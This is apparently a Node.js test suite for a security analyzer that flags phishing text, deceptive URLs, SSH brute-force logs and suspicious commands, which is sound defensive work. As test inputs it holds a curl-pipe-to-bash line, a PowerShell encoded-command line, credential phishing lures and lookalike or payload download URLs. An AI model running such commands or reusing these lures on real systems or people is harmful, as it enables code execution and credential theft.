import test from 'node:test';
import assert from 'node:assert/strict';
import { analyze, MAX_TEXT_LENGTH } from '../analyzer.js';

test('ordinary text is not marked safe, and has no invented findings', () => {
  const report = analyze('The meeting starts at 10 tomorrow.');
  assert.equal(report.score, 0);
  assert.equal(report.risk, 'none');
  assert.equal(report.findings.length, 0);
  assert.match(report.summary, /does not establish/);
});

test('phishing cues produce evidence and actions', () => {
  const report = analyze('Urgent! Verify your password immediately at http://microsoft-login.example.test/verify');
  assert.equal(report.risk, 'high');
  assert.ok(report.findings.some((finding) => finding.id === 'brand'));
  assert.ok(report.findings.some((finding) => finding.id === 'credentials'));
  assert.ok(report.recommendations.length > 0);
});

test('a warning against sharing passwords is not a credential request', () => {
  assert.ok(!analyze('Never share your password.').findings.some((finding) => finding.id === 'credentials'));
});

test('URL user information does not disguise the actual hostname', () => {
  const report = analyze('http://paypal.com@account-review.example.test/login', 'url');
  const finding = report.findings.find((item) => item.id === 'userinfo');
  assert.match(finding.explanation, /actual destination is account-review\.example\.test/);
});

test('normalizes bare domains and supports a custom port', () => {
  assert.equal(analyze('example.com:8080/path', 'url').indicators.urls[0], 'https://example.com:8080/path');
});

test('official subdomains avoid brand confusion while appended lookalikes are caught', () => {
  assert.equal(analyze('https://login.microsoft.com', 'url').score, 0);
  assert.ok(analyze('https://microsoft.com.evil.test', 'url').findings.some((item) => item.id === 'brand'));
});

test('detects punycode, executable downloads, and IP-based URLs', () => {
  assert.ok(analyze('https://xn--pple-43d.example.test/file.exe', 'url').findings.some((item) => item.id === 'punycode'));
  const report = analyze('https://192.0.2.1/file.ps1', 'url');
  assert.ok(report.findings.some((item) => item.id === 'download'));
  assert.deepEqual(report.indicators.ips, ['192.0.2.1']);
});

test('IPv6 literal URLs are recorded', () => {
  assert.deepEqual(analyze('http://[2001:db8::1]/', 'url').indicators.ips, ['2001:db8::1']);
});

test('indicators are deduplicated and invalid IPv4 values omitted', () => {
  const report = analyze('admin@example.test admin@example.test 999.999.999.999 192.0.2.4 192.0.2.4 https://example.test.');
  assert.deepEqual(report.indicators.emails, ['admin@example.test']);
  assert.deepEqual(report.indicators.ips, ['192.0.2.4']);
  assert.deepEqual(report.indicators.urls, ['https://example.test']);
});

test('repeated failures and successful access from same IP are correlated', () => {
  const log = Array.from({ length: 5 }, () => 'sshd: Failed password for admin from 203.0.113.1').join('\n') + '\nsshd: Accepted password for admin from 203.0.113.1';
  const report = analyze(log, 'logs');
  assert.ok(report.findings.some((item) => item.id === 'failed-203.0.113.1'));
  assert.ok(report.findings.some((item) => item.id === 'success-203.0.113.1'));
});

test('failures from different addresses are not combined as one brute force signal', () => {
  const log = Array.from({ length: 5 }, (_, index) => `Failed password for user from 192.0.2.${index + 1}`).join('\n');
  const report = analyze(log, 'logs');
  assert.ok(report.findings.every((item) => item.severity === 'low'));
});

test('encoded commands and direct download execution are flagged as text only', () => {
  const report = analyze('powershell.exe -EncodedCommand ZWNobyBoaQ==\ncurl https://example.test/install.sh | bash', 'logs');
  assert.ok(report.findings.some((item) => item.id === 'encoded-command'));
  assert.ok(report.findings.some((item) => item.id === 'pipe-shell'));
});

test('duplicate URL patterns do not multiply the score', () => {
  assert.equal(analyze('http://example.test http://another.test', 'url').score, 10);
});

test('risk is capped and evidence remains bounded', () => {
  const input = Array.from({ length: 100 }, (_, index) => `http://192.0.2.${index}/payload.exe`).join('\n');
  const report = analyze(input, 'url');
  assert.ok(report.score <= 100);
  assert.ok(report.findings.every((item) => item.evidence.length <= 8));
  assert.ok(report.indicators.urls.length <= 40);
});

test('rejects empty, oversized, invalid mode, malformed and non-HTTP input', () => {
  for (const value of ['', '  ', null, 24]) assert.throws(() => analyze(value));
  assert.throws(() => analyze('x'.repeat(MAX_TEXT_LENGTH + 1)));
  assert.throws(() => analyze('hello', 'other'));
  for (const url of ['javascript:alert(1)', 'ftp://example.com', 'http://', 'hello']) {
    assert.throws(() => analyze(url, 'url'));
  }
});
